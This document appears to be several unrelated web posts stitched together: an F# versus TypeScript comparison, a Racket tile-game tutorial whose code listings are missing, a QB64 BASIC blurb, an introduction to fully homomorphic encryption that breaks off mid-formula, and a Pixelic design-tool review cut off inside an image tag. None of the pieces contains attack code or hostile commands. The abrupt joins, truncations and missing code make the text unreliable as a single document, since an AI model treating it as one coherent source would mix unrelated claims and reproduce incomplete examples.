<p>When Microsoft announced <a href="https://www.typescriptlang.org/">TypeScript</a> back in 2012, tooling was poor and excitement limited. It needed a significant player in the JavaScript world, Angular, to pick it up, to gain momentum. Today it is so widely used that I consider it the de facto standard for modern web development.</p>
<p>Its success is driven by a powerful type system plus the fact that it is similar enough to JavaScript to keep the learning curve relatively flat. Besides support for immutable data structures, I do not miss much of what I would expect from a modern programming language.</p>
<h2>A Small Case Study</h2>
<p>Now, how to make an informed decision that is not solely based on gut feelings? Good question. I decided to <a href="https://github.com/aspnetde/typesafe-spa">conduct a small case study</a>, which I designed to explore three different options to build a type-safe single page application:</p>
<ol>
<li><a href="https://github.com/aspnetde/typesafe-spa#elmish--feliz">F# + Elmish + Feliz</a></li>
<li><a href="https://github.com/aspnetde/typesafe-spa#react-function-components--feliz">F# + React Function Components + Feliz</a></li>
<li><a href="https://github.com/aspnetde/typesafe-spa#react-function-components--feliz">TypeScript + React</a></li>
</ol>
<p>In particular, I wanted to find answers to the following questions:</p>
<ol>
<li>How are parent-child relationships handled?</li>
<li>How much boilerplate code needs to be written?</li>
<li>How much guidance and support provides the compiler?</li>
<li>How maintainable, aka scalable, does the approach appear to be?</li>
</ol>
<p>The answers to those questions have already been covered in a <a href="https://thomasbandt.com/scaling-model-view-update">separate post</a>. Summary: Going with React components, either with F# or TypeScript, will make you write less code. Whereas choosing MVU (with F# + Elmish) may provide more safeguards through an architecture that is easy to understand and harder to produce errors in.</p>
<p>The bottom line is: Technically, all three approaches are valid, each of them has different strengths and weaknesses. So I cannot recommend one over the other. But I can introduce some more things to consider when making that choice.</p>
<h2>More Things To Consider</h2>
<h3>Language Qualities</h3>
<p>Code written in F# for me more often than not is concise, easy to write, and even more comfortable to read, containing only very few noisy elements. I sometimes sit in front of my computer and just look at F# code, enjoying its beauty. Seriously, that's probably what sets it apart from most other languages I've had the chance to work with. And it brings literally back the joy in programming to me. That's a factor that cannot be stressed enough, in my opinion. I firmly believe that many bored or almost burned out, but very seasoned developers could quickly be sold on it and "flipped."</p>
<p>Whereas TypeScript certainly has different qualities. I like how it integrates with the JavaScript world, offering its type system's help where wanted. But allowing at the same time developers to keep writing their code in the JS style they are used to. It seems to walk the line perfectly fine between the strengths of a statically-typed language and some flexibility and freedom, e.g., through supporting duck-typing. So while I personally am not a big fan of curly braces and semicolons anymore, TypeScript surely provides an enjoyable developer experience as well.</p>
<h3>Vendor Support</h3>
<p>TypeScript receives a lot of attention, not only from Microsoft but industry-wide. I don't see a sign that its development might slow down in the foreseeable future.</p>
<p>Similarily, F# has always been supported by Microsoft since its inception, and a (small) team is actively working on it. So there is no reason to worry about the future of the language itself.</p>
<p>However, while TypeScript is the whole package of compiler plus language, F#'s web story is a bit different. It relies on Fable as the F# to JavaScript compiler. And Fable is a complex operation which, right now, depends on only a few people's willingness to continue to work on it in their spare time (also see "bus factor" below).</p>
<h3>Tooling</h3>
<p>The tooling support for TypeScript is just great. For example, it integrates well in Visual Studio Code and is supported by many other editors and IDEs. Several of them are commercially supported.</p>
<p>The same is actually true for F#. Visual Studio (on Windows and macOS), <a href="https://www.jetbrains.com/rider/">Jetbrains Rider</a> (on Windows, macOS, and Linux) and <a href="https://ionide.io/">Ionide</a> (on all three platforms as well) support it.</p>
<h3>Ecosystem</h3>
<p>For TypeScript, a large amount of JavaScript packages are supported by the community. At the time of writing, there are 6,892 packages supported alone through the <a href="https://github.com/DefinitelyTyped/DefinitelyTyped">DefinitelyTyped</a> project.</p>
<p>Whereas the situation for Fable and F# is not that bright at the moment. There is support for a few essential players, e.g., React and Electron. But if you want to use a small random library, you most likely have to create (and maintain!) those bindings by yourself. Which is not a really complicated task â€“ but one that steals time, which could otherwise be spent working on your own project. And if some of the maintainers of the existing bindings lose interest in them, there is a big chance you will inherit them sooner or later (again, see bus factor).</p>
<h3>Bus Factor</h3>
<p>The sheer number of stakeholders makes TypeScript a safe bet for most things, e.g., tooling or library support. It's not only backed and actively developed by Microsoft, but also used by major web frameworks like Angular (Google) and Vue, or at least officially supported (React, Facebook). But it's not only the impressive number of large players. The community also consists of a large number of individual contributors.</p>
<p>Fable, on the other hand, has a small but active community of contributors and a few companies that are backing it (e.g., through <a href="https://safe-stack.github.io/">SAFE Stack</a>). However, the key drivers of the whole ecosystem are only a dozen or so people who move the entire platform forward in their spare time.</p>
<p>I personally see the chance of reaching the tipping point where the ecosystem might be able to grow faster â€“ but that's totally subjective and possibly more wishful thinking than reality.</p>
<h3>The Pit Of Success</h3>
<p>As <a href="https://blog.codinghorror.com/falling-into-the-pit-of-success/">described by Jeff Atwood</a>:</p>
<blockquote>
<p>The Pit of Success: in stark contrast to a summit, a peak, or a journey across a desert to find victory through many trials and surprises, we want our customers to simply fall into winning practices by using our platform and frameworks. To the extent that we make it easy to get into trouble we fail.</p>
</blockquote>
<p>While TypeScript is a tool that integrates smoothly in the JS ecosystem, F# and Fable run on top of it. When using Elmish, JS is the eventual compilation target, and React is the execution layer on which the actual F# application is running without many external dependencies. Given this and the high robustness of the F# compiler plus the reliable guidance by the MVU architecture, it makes Fable and F# a poster child of the idea of the pit of success.</p>
<p>Whereas with TypeScript, every component might look different, depending on its author's taste and level of experience.</p>
<h3>Talent Pool</h3>
<p>There is no doubt that TypeScript is one of the <a href="https://insights.stackoverflow.com/survey/2020#most-loved-dreaded-and-wanted">most loved programming languages</a> on earth at the time of writing. So it should not be complicated to find TypeScript developers or train any developer on using it.</p>
<p>While not at all being that popular, I think the story for F# might be more rewarding. There is a large pool of .NET developers who mainly use C# today. A language that adopted and continues to borrow more and more features from F# and that is getting more and more bloated on the way. As already mentioned: I believe that many talented and seasoned C# developers can be trained to use F#. This will make programming more enjoyable to them again and allow you to leverage their experience on the .NET platform.</p>
<h2>Conclusion</h2>
<p>As you can see, there are valid arguments for both TypeScript and F#. While I can and will not pick a winner at this point, I hope some information in this post can help you to make an informed decision yourself. I am sure it will be the right one! ;-)</p>

<p>… in which we attempt to recreate a game from the nineties using the <a href="https://alex-hhh.github.io/2020/06/www.racket-lang.org">Racket</a> graphical facilities and we manage to do it in less than 1000 lines of code.</p>

<h2 id="the-game-play">The Game Play</h2>

<p>Instead of explaining the game, it is easier to show the game play. In the video below, the valid tiles are marked with their score, but this would be considered cheating in the actual game. The objective here, however, is to program the game, not to play it.</p>

<p>By the way, if you are in a hurry, you can go directly to the <a href="https://gist.github.com/alex-hhh/2e204b3a9d9d7094f65a0b585d0b7480">the source code</a> for the game.</p>

<hr>

<p>
 <iframe width="700" height="422" src="https://www.youtube.com/embed/UKMgURA5Wg8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="allowfullscreen"></iframe></p>

<hr>

<p>The game is played on a 8x12 board with 72 tiles. There are six colors and six images which combined produce 36 unique tiles. Two of each tile are combined to make the playing set. The objective of the game is to place all the tiles on the board with the following rules:</p>

<ul>
 <li>
  <p>a tile must be placed next to one or more tiles</p></li>
 <li>
  <p>a tile can be placed next to another one if either their color or image  match. If there are multiple tiles around the tile, each neighbor must  match either the color or the image.</p></li></ul>

<p>The game starts with the first six tiles already on the board, one in each corner and two in the middle. The tiles are selected such that each possible color and each possible image is present on the board, thus ensuring that the very first tile can be placed on the board.</p>

<p>Scoring is done to reflect the complexity of the placement, with 1 point awarded if a tile is placed next to a single tile, 2 points for placing it against two tiles, 4 points for placing it against 3 neighbors and 8 points for placing it against 4.</p>

<p>The game ends when either there are no more tiles to be placed on the board or there is no valid location on which to place a tile.</p>

<h2 id="the-libraries">The Libraries</h2>

<p>Given that this is an interactive game where the user needs to drag tiles on a board, the easiest way to implement this game is to use <a href="https://docs.racket-lang.org/gui/Snip_and_Style_Classes.html">snips</a> and a <a href="https://docs.racket-lang.org/gui/editor-overview.html">pasteboard</a>. The <code>pasteboard%</code> is one of the two editors provided by the Racket GUI framework and it will handle most of drag and drop functionality which the game requires. To use it, we will need to provide two classes:</p>

<ul>
 <li>
  <p>a <code>snip%</code> class which represents a tile. A snip is an object which knows  its size and how to draw itself. You can do cool things with snips, such as  <a href="https://alex-hhh.github.io/2019/09/map-snip.html">rendering maps</a> and even basic <a href="https://alex-hhh.github.io/2019/09/interactive-heat-maps.html#embedded-snip-controls">GUI  controls</a>.</p></li>
 <li>
  <p>a <code>pasteboard%</code> class which manages the snips (it can also draw things of  its own). While we can use the <code>pasteboard%</code> directly for testing purposes,  we will need to define our own class to implement the restrictions imposed  by the game.</p></li></ul>

<p>The game will also use the <a href="https://docs.racket-lang.org/draw/index.html">racket/draw</a> facilities for drawing directly to a device context. The draw functions provided by <code>snip%</code> and <code>pasteboard%</code> already use <code>dc&lt;%&gt;</code> objects, and while we could have used the <code>pict</code> library for rendering, for this simple case, it was thought unnecessary.</p>

<h2 id="the-assets">The Assets</h2>

<p>While the game board can be drawn using just lines, the game tiles will need six colors and six images, and it would help if these images would be nice ones, rather than using simply a circle, square and triangle shapes. The Unicode character set has lots of <a href="http://unicode.org/emoji/charts/full-emoji-list.html">emoji characters</a> to choose from, and these are directly supported by Racket, which means that they can be stored in strings.</p>

<p>In the game code, I choose to represent the unicode characters using the <code>\U</code> escape sequence followed by a code point, and during development using <code>display</code> or the <code>text</code> pict constructor to see the actual glyphs in the DrRacket REPL:</p>

<div><p><img src="https://alex-hhh.github.io/img/a040/glyphs.png" alt=""></p></div>

<p>Choosing six colors can also be a difficult task if we want colors which look nice, are visually distinct and are also distinct for color-blind people. I don’t know how to chose colors which meet all this criteria, so my preferred way is to find color schemes defined by others, in this case, one of <a href="https://personal.sron.nl/~pault/">Paul Tol’s Color Schemes</a>, the “bright qualitative” one:</p>

<div><p><img src="https://alex-hhh.github.io/img/a040/colors.png" alt=""></p></div>

<h2 id="the-theme">The Theme</h2>

<p>Rather than storing the drawing assets (color and glyph) in each tile object, a helper class can be used to manage the common functionality and assets for all snips. A theme class also allows changing the “theme”, that is the colors and images at runtime — this is not implemented in this game, but could be added easily. Even without the ability to change themes, moving some common functionality in a separate class keeps the tile class simpler.</p>

<p>In addition to managing the graphics assets for drawing, the theme class also provides the size of each tile (the <code>cell-width</code> and <code>cell-height</code> fields). These are calculated by the board itself when it is resized and communicated to the theme and from here used by all tiles in the game:</p>



<h2 id="the-tiles">The Tiles</h2>

<p>The tiles represent the objects that can be moved on the board and they are implemented using snips. Two things are needed to create a new snip: define a snip class (not to be confused with a racket <code>class%</code>) and create a class derived from <code>snip%</code> overriding the <code>get-extent</code> and <code>draw</code> methods.</p>

<p>The snip class is used for serializing and de-serializing snip objects, but even though we don’t use this functionality in the game, we still need to define one. The definition is identical for any snip class, except they need to have unique names. Note that the snip class is actually an instance of <code>snip-class%</code> and not a class in itself:</p>

<p>We define our own <code>tile%</code> class derived from the <code>snip%</code> class. As far as the pasteboard is concerned, the new object needs to: (1) set the snip class for each instance (see the <code>set-snipclass</code> call below, (2) define a <code>get-extent</code> method which the pasteboard can use to determine the size of the snip and (3) define a draw method which is used to draw the snip.</p>

<p>In addition to the snip interface, also has a <strong>key</strong> a <strong>theme</strong> and a <strong>location</strong>. The <strong>key</strong> is a structure which contains the color and glyph codes for the tile and the <strong>theme</strong> is an object which holds the colors and glyphs used by the game (the tile class will ask the theme for the actual color to use corresponding to its key). The key and the theme are used for drawing the snip. Finally, the <strong>location</strong> is a structure which holds the location of the tile on the board (column and row). It is not used by the tile class at all, but it the pasteboard will need to know the location of each tile, so might as well store it inside the tile object you can find the full definition in the <a href="https://gist.github.com/alex-hhh/2e204b3a9d9d7094f65a0b585d0b7480">game source code</a>.</p>



<p>With the tile snip defined, we can write a quick test program to see how it works. Here we will use just a plain <code>pasteboard%</code> which will display the snip and allow moving them around with the mouse. There are several objects which make up the “game”:</p>

<ul>
 <li>the <code>bq-colors</code>, and <code>bird-glyphs</code> define the colors and images to use for  the tiles and they are managed by the <code>theme</code> object</li>
 <li>the <code>board</code> is simply the <code>pasteboard%</code> instance we’ll use</li>
 <li><code>toplevel</code> is the toplevel GUI window for the application, an instance of  the <code>frame%</code> class</li>
 <li><code>canvas</code> is the <code>editor-canvas%</code> which acts as the view for the  <code>pasteboard%</code> (the pasteboard itself only manages snips, displaying is  handled by one or more <code>editor-canvas%</code> instances)</li></ul>

<p>The code also creates six tiles, one for each color and image and inserts them into the pasteboard.</p>

<p>The result is an interactive application, which allows dragging the snips around. The <code>pasteboard%</code> provides a lot of functionality out of the box, but it still needs to be further customized to restrict its functionality according to the rules of the game (for example, snips should only be placed in precise positions on a board):</p>

<div><p><img src="https://alex-hhh.github.io/img/a040/pasteboard.gif" alt=""></p></div>

<h2 id="the-pouch">The Pouch</h2>

<p>Having defined the tiles, we need to produce 72 of them, preferably in random order, so it they can be used in the game. To generate all the possible tiles, we can use nested for loops over the all the possible colors and images:</p>



<p>The previous list is ordered by color and image, and we need to shuffle it:</p>



<p>Finally, and this is the tricky bit, the first six tiles need to have unique colors and images. This is because the first six tiles are already on the board when the game starts and to ensure that the user can always place the next tile, all the colors and images need to be on the board. To achieve this, we loop over the shuffled tiles and move the first six unique tiles to the front. Doing this ensures that, while the first tiles are unique, they also start in a random order for each game.</p>

<h2>From the 80s to eternity</h2>



<p><strong>How BASIC made its way into the 21st century</strong></p>



<p>The BASIC language has been the gateway into programming for countless people. Popular as a beginner programming language in the 80’s and evolving into a powerful professional tool in 90’s, BASIC (and its successor QBasic), helped many people develop a love for programming. These languages provided the foundational learning platform for most of today’s professional developers.</p>



<p>The QB64 project has evolved over the last decade to bring the magic and educational potential of BASIC from its 20th century roots into the modern era. The QB64 project is already in use in both educational and professional contexts and has an active and helpful user community.</p>



<p>Unlike traditional BASIC and QBasic code, QB64 gets compiled automatically into machine code – allowing exceptional performance, easy distribution, and the ability to link with external C and C++ programming libaries. Compatible with most QBasic 4.5 code, QB64 adds a number of extensions, such as OpenGL and other modern features, providing the perfect blend of classic and modern program development.</p>



<p>QB64 is available for all recent Windows, Linux, and macOS versions.</p>

    <h2 id="preface">Preface</h2>

<p>Recently I have taken <a href="https://cs355.stanford.edu/"><strong>CS355 (Topics in Cryptography)</strong></a> at Stanford. This was a comprehensive course on advanced crypto topics.</p>

<p>Throughout the 3-month course, the instructors covered various topics that span the history of Cryptography, starting from One-way Functions, PRFs all the way to applied cryptosystems such as <strong>MPC, Zero-Knowledge, and PIR</strong>. This was really a great course to take, and I’ve surely learned a lot about modern cryptosystems.</p>

<p>In order to strengthen my understanding of these topics, I’ve decided to start a series of blog posts that (gently) introduces these cool crypto topics. I’ll be summarizing lecture notes and paraphrase them into my own words. Hopefully, it should be an interesting (and not obscure) read that helps you understand these topics as well.</p>

<p>For the first series of posts, I want to talk about <strong>Fully Homomorphic Encryption (FHE)</strong>, a fairly hot topic in the security industry.</p>

<p><em>Note that I’ll try to make my explanation as simple as possible, but still make sure that you have some security/cryptography context before continuing…</em></p>

<p><img src="https://images.unsplash.com/photo-1510511459019-5dda7724fd87?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=2100&amp;q=80" alt=""></p>

<h2 id="what-is-fhe">What is FHE?</h2>

<p>I shall begin the post with a brief introduction of FHE, or <strong>Fully Homomorphic Encryption</strong>.</p>

<p>According to Wikipedia, the definition of Homomorphic Encryption is:</p>

<blockquote>
  <p>A form of encryption that allows computation on ciphertexts, generating an encrypted result which, when decrypted, matches the result of the operations as if they had been performed on the plaintext.</p>
</blockquote>

<p>The definition is exactly right - Homomorphic Encryption is simply the encryption scheme where one can combine encrypted ciphertexts and obtain interesting computations on the original plaintext in an encrypted form without knowing the actual encryption key.</p>

<h3 id="an-overview-of-encryption-schemes">An Overview of Encryption Schemes</h3>

<p>If you are familiar with crypto/security materials, you might know a few common encryption schemes such as AES and RSA. Although there’s a difference between symmetric and asymmetric encryption schemes, every scheme could be generalized in the following form.</p>


<p>
graph LR;
	G((KeyGen)) -.- pk(EncKey)
	G -.- sk(DecKey)
	pk --&gt; Encryption
	sk --&gt; Decryption
	Plaintext --&gt; Encryption
	Encryption --&gt; Ciphertext
	Ciphertext --&gt; Decryption
	Decryption --&gt; Pt2[Plaintext]
</p>

<p>From the diagram, we can see the overall composition of an encryption scheme:</p>

<ol>
  <li>There is a \(KeyGen\) algorithm that generates the key used for both encrypting and decrypting. Notice that in a symmetric scheme both keys are the same, and in an asymmetric scheme the keys are different. (One is called Public Key and the other is called Private Key)</li>
  <li>The \(Encryption\) algorithm applies encryption to a given plaintext using the encryption key. Then it produces the ciphertext, which is the encrypted plaintext.</li>
  <li>The \(Decryption\) algorithm inverts the encryption done on a ciphertext using the decryption key. It restores the ciphertext back to the original plaintext.</li>
</ol>

<p>There it is. It doesn’t matter which algorithm we use (AES or RSA or something else), the overall structure is always the same.</p>

<p>In Cryptography, we tend to always write about <strong>properties</strong> of a system after introducing it. Therefore, I should also talk about it for the sake of completeness.</p>

<p>First, an encryption needs to have <strong>Correctness</strong>. This means that applying decryption on a ciphertext that was the result of applying encryption on some plaintext \(pt\), using the keys derived from \(KeyGen\), will always guarantee to result in the same plaintext \(pt\) as before. To capture this relation in the language of probability, we use the following expression:</p><p>

\[\forall pt \in PT, (k_{enc}, k_{dec}) \leftarrow KeyGen(1^\lambda):\\
Pr[Decryption(k_{dec}, Encryption(k_{enc}, pt)) = pt] = 1\]

</p><p>This means that the <strong>probability</strong> of applying decryption on encrypted ciphertext using the appropriate keys will <strong>always result in the exact same plaintext</strong> as before.</p>

<p>The second property that we want is <strong>Semantic Security</strong>. I’m not going to do the full proof here, but the basic idea is that, given two encrypted ciphertexts \(ct_0, ct_1\) that corresponds to the encryption of \(pt_0, pt_1\), one cannot distinguish which ciphertext is the encryption of \(ct_0\). This basically means that the encrypted ciphertext looks random and doesn’t provide any hint to its original plaintext, therefore ensuring that this scheme is secure against eavesdropping.</p>

<p><img src="https://images.unsplash.com/photo-1526732928503-5c58853877ae?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1650&amp;q=80" alt=""></p>

<h3 id="homomorphic-encryption---an-unexpected-property">Homomorphic Encryption - an unexpected property</h3>

<p>If encrypted ciphertexts look just like random garbage to any viewers, does this mean that ciphertexts are totally useless unless the corresponding decryption key is present?</p>

<p><strong>Both luckily and unluckily, the answer is NO.</strong></p>

<p>Some encryption schemes actually exhibits an amazing property, where if you obtain the encryption of number 1 and number 2, although you have no idea what the original plaintexts are, you can simply add these two ciphertexts together, and obtain the encrypted ciphertext for \(1 + 2 = 3\).</p>

<p>This property is called <strong>Homomorphism</strong> - where the algebraic relationship on plaintexts is also preserved in the ciphertexts. And encryption schemes that exhibits this trait are therefore referred as <strong>Homomorphic Encryption</strong>.</p>

<p>The example we gave above is just an instance of Homomorphic Encryption. Namely, this is an instance of <strong>Additively Homomorphic Encryption</strong>, where one can freely add ciphertexts together and obtain any linear combination of the original plaintexts, in encrypted form. Of course, there is also <strong>Multiplicative Homomorphic Encryption</strong>, the counterpart of AHE. In a MHE scheme, one can freely multiply ciphertexts together and obtain any products of the original plaintexts.</p>

<p>Pretty interesting right? However, if you think this concept is still a bit vague, allow me to provide an example.</p>

<h4 id="example-anonymous-polling">Example: Anonymous Polling</h4>

<p>We all know how polling works - for example, when a group of people want to vote on something (say whether they want to order Japanese for lunch), they could start a poll.</p>

<p>In the poll process, everyone will submit their choice of either <strong>going (1)</strong> or <strong>not going (0)</strong> to the host. Then the host simply adds everyone’s share together, and compares whether this final result is larger than \(1/2\) of the population.</p>

<p>However, the problem with this scheme is that the polling process is not anonymous. This means that anyone who can see the data traffic will know who likes and dislikes Japanese food - just by looking at everyone’s shares.</p>

<p>We can convert this protocol into an anonymous one easily with the help of <strong>Additively Homomorphic Encryption</strong>.</p>

<p>First, the host will run the \(KeyGen\) algorithm that generates a pair of encryption key \(pk\) and decryption key \(sk\). (Here, we are using an asymmetric encryption scheme.) Then the host distributes the encryption key \(pk\) to the public.</p>

<p>Now the polling begins. Every participant will encrypt their choice (either 1 or 0) under the encryption key \(pk\) using the \(Encryption\) algorithm. Then they will all send their ciphertexts to the host.</p><p>

\[ct_i = Encryption(pk, pt_i):pt_i \in \{0,1\}\]

</p><p>The host adds up all the encrypted ciphertexts and forms one ciphertext \(\hat{ct}\). Finally the host then runs the decryption algorithm on the ciphertext and obtain the result of the poll.</p><p>

\[Decryption(sk, \sum_i ct_i) = \sum_i pt_i\]

</p><p>This might not do the full justice to the true power of HE. But this should be a solid example where HE allows us to do some kind of <strong>Secure Delegated Computation</strong> - meaning that we can <strong>delegate</strong> some third party to compute on <strong>secret inputs</strong> we have by encrypting our inputs using HE schemes. The third party then applies whatever computation directly on the ciphertext and obtains the result ciphertext that is the encryption of the computation result. Finally we can decrypt that ciphertext and receive the result.</p>

<p>We should be pretty comfortable with what HE is, and what kind of application it enables us to do. Now, I want to briefly go over different levels (or stages) of HE that will eventually lead us to Fully Homomorphic Encryption.</p>

<h4 id="partially-homomorphic-encryption">Partially Homomorphic Encryption</h4>

<p>This is the very first stage of HE. If there exists an encryption scheme that is <strong>partially homomorphic</strong>, this means that this scheme is <strong>either additively homomorphic or multiplicatively homomorphic</strong>.</p>

<p>In other words, let’s say that in the Delegated Computation example, we would like the remote server to compute some functionality \(F\). If the HE scheme we choose is only partially homomorphic (for example, additively homomorphic), it means that the only thing we can do to the ciphertexts is to <strong>obtain an encrypted linear combination of the plaintexts</strong>.</p>

<p>Therefore, if we have inputs \(ct_0, ct_1\) that corresponds to \(pt_0, pt_1\), this HE scheme allows us to compute \(Enc(pk, c_0 \cdot pt_0 + c_1 \cdot pt_1)\) where \(c_0, c_1\) are some constants. However, with this scheme it is not possible to compute the product of the two plaintexts \(Enc(pk, pt_0 \cdot pt_1)\) or anything like that.</p>

<p>To summarize, if the HE scheme is just additively homomorphic, then the functionality \(F\) that the third party can compute is <strong>limited to all the functions where their outputs can be expressed as linear combinations of all the inputs</strong>.</p>

<p>This is exactly the same for schemes that are only <strong>multiplicatively homomorphic</strong> - the functionality \(F\) then will be limited to all functions where their outputs can be expressed as products of their inputs.</p>

<h4 id="somewhat-homomorphic-encryption">Somewhat Homomorphic Encryption</h4>

<p>This next category brings us closer to our ideal world. If we say that an HE scheme is <strong>somewhat homomorphic</strong>, this means that the HE scheme is capable of doing both addition and multiplication to the original plaintexts but its capability is heavily limited.</p>

<p>A typical HE scheme example would be - let’s say that there is a somewhat homomorphic HE scheme where  you can perform unlimited additions but only one level of multiplication to the ciphertext. In such scheme, given \(ct_0, ..., ct_2\), we can obtain something like \(Enc(pk, …</p></div></article></div></div></div>

                    <p>A few weeks ago, our team adopted a tool called <a href="https://www.pixelic.io/">Pixelic</a>, a UX collaboration tool that integrates with Figma and Slack to make design feedback, task management, and documentation more accessible.</p><figure><img src="https://blog.pixelic.io/content/images/2020/07/Screenshot-2020-07-01-14.57.58.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/07/Screenshot-2020-07-01-14.57.58.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/07/Screenshot-2020-07-01-14.57.58.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/07/Screenshot-2020-07-01-14.57.58.png 1600w, https://blog.pixelic.io/content/images/size/w2400/2020/07/Screenshot-2020-07-01-14.57.58.png 2400w" sizes="(min-width: 1200px) 1200px"><figcaption>Pixelic's Figma frames screen.</figcaption></figure><p>I observed our team go through multiple design iterations using the tool and thought it’d be helpful for other designers and teams to get a perspective on how Pixelic makes the UX design process much easier.</p><p>Here are three topics that I’ll be sharing:</p><ol><li>When do you use Pixelic? A use case for teams</li><li>Tracking history and product backlog through Pixelic</li><li>Creating a shared understanding via Pixelic and its efficacy</li></ol><h2 id="when-do-you-use-pixelic">When do you use Pixelic?</h2><figure><img src="https://blog.pixelic.io/content/images/2020/06/106546009_877858009376814_471483989897433073_n.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/06/106546009_877858009376814_471483989897433073_n.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/06/106546009_877858009376814_471483989897433073_n.png 1000w, https://blog.pixelic.io/content/images/2020/06/106546009_877858009376814_471483989897433073_n.png 1566w" sizes="(min-width: 720px) 720px"><figcaption>This process chart describes our team’s current UX design process from ideation to retrospectives.</figcaption></figure><p>Rows colored in yellow (from rough sketch, discussion/UX policies, to design QA) were design phases where Pixelic made our collaboration easier.</p><h2 id="improvement-points">Improvement Points</h2><p>Pixelic launched its first open beta in May 2020, so there were areas for improvement and a few features still in development.</p><p>We needed a wiki-like feature where we could take notes, store UX specifications, and share them with product and engineering teams. Notion and Zeplin were our go-to-tools for this during the “Understanding” phase in our design process.</p><p>It was pretty difficult to switch from Notion/Zeplin right away, but we hope to see more improvements in Pixelic’s documentation features.</p><h2 id="where-pixelic-came-in-handy-for-our-team">Where Pixelic came in handy for our team</h2><p>We realized that Pixelic could be a source of truth for the communication log as it integrates with Figma and Slack. This came in handy during our Design QA phase.</p><p>Before Pixelic, we had to manually create QA documents in Notion and share it with our engineering and product partners. We would copy and paste several links, upload screenshots, write thorough descriptions on the acceptance criteria.</p><figure><img src="https://blog.pixelic.io/content/images/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png 1600w, https://blog.pixelic.io/content/images/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png 1942w" sizes="(min-width: 720px) 720px"><figcaption>Sample Notion screen. There was so much to fill out in Notion to make our design QA work.</figcaption></figure><p>With Pixelic, we’re now able to just import Figma frames into the tool and write acceptance criteria using Pixelic’s annotation feature. There’s no need for us to take screenshots, copy/paste Zeplin links, and communicate with our engineering partners to create QA tasks. Pixelic did them all automatically.</p><h3 id="1-tracking-design-task-backlog-history">1) Tracking design task backlog history</h3><p>Not having an optimal product development and design process often made our workflow less productive. It looked something like this:</p><ol><li>Designer “A” and Developer “B” review design and exchange feedback in Slack</li><li>They then add the outcome (often design tasks) of the meeting to a Jira project Kanban board under the backlog</li><li>Product manager “C” notices the new task, but doesn’t have any context as to why it was created. So “C” requests designers “A” &amp; “B” to explain.</li><li>Teammates “A” &amp; “B” stop what they were doing, and loop C in so “C” could understand the context</li></ol><p>If only we had a place where the product manager (“C”) can read/understand the context behind a task or decision without asking the designers “A” and “B,” they would have kept their focus on doing more important tasks. We became less productive as a team due to redundant meetings and discussion. (Meetings are seldom productive!)</p><p>We found that Pixelic was a perfect tool for this pain point. Here are a few ways Pixelic helped us:</p><h3 id="2-pixelic-automates-task-creation-process">2) Pixelic automates task creation process</h3><p>It’s pretty difficult to keeping track of action items during design reviews. Someone has to take charge of translating discussions into actionable tasks and adding them to a project board while others continue discussing.</p><p>But with Pixelic, all you need to do is click the “taskify” button on each comment. Even during meetings, you can convert comments into tasks while viewing the design, so there’s no “context-switching cost” incurred. Pixelic lets you convert comments into tasks without diverging from the discussion.</p><figure><img src="https://blog.pixelic.io/content/images/2020/06/taskify.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/06/taskify.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/06/taskify.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/06/taskify.png 1600w, https://blog.pixelic.io/content/images/size/w2400/2020/06/taskify.png 2400w" sizes="(min-width: 1200px) 1200px"><figcaption>"Taskify" button on each comment on Pixelic converts respective comments into tasks</figcaption></figure><p>Traditionally, teams switch between communication apps (e.g., Slack) and task management apps (e.g., Jira, Notion, etc.) to go back and forth, discussing and adding tasks. Pixelic converges them together so that you can instantly flip the switch to “taskify” a comment.</p><figure><img src="https://blog.pixelic.io/content/images/2020/06/1_q8SiG2je4mdAT3AOo5qeCA--1-.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/06/1_q8SiG2je4mdAT3AOo5qeCA--1-.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/06/1_q8SiG2je4mdAT3AOo5qeCA--1-.png 1000w, https://blog.pixelic.io/content/images/2020/06/1_q8SiG2je4mdAT3AOo5qeCA--1-.png 1400w" sizes="(min-width: 1200px) 1200px"><figcaption>Switching back and forth Slack and Notion to manage feedback and tasks at the same time is cumbersome.</figcaption></figure><p>Pixelic also has built-in version control for each Figma frame. With this feature, you can track all comments by each version.</p><figure><img src="https://blog.pixelic.io/content/images/2020/07/Screen-Shot-2020-07-01-at-14.33.16.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/07/Screen-Shot-2020-07-01-at-14.33.16.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/07/Screen-Shot-2020-07-01-at-14.33.16.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/07/Screen-Shot-2020-07-01-at-14.33.16.png 1600w, https://blog.pixelic.io/content/images/size/w2400/2020/07/Screen-Shot-2020-07-01-at-14.33.16.png 2400w" sizes="(min-width: 720px) 720px"></figure><h3 id="3-pixelic-tasks-connect-with-figma-frames-and-their-comments-2-ways-">3) Pixelic tasks connect with Figma frames and their comments “2-ways”</h3><p>Pixelic’s unique task management feature allows designers to access Figma frames directly from the tasks. This is different from what you see in Notion or Jira, Pixelic’s Figma integration imports actual Figma frames into the tool for you.</p><figure><img src="https://blog.pixelic.io/content/images/2020/07/task-comments.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/07/task-comments.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/07/task-comments.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/07/task-comments.png 1600w, 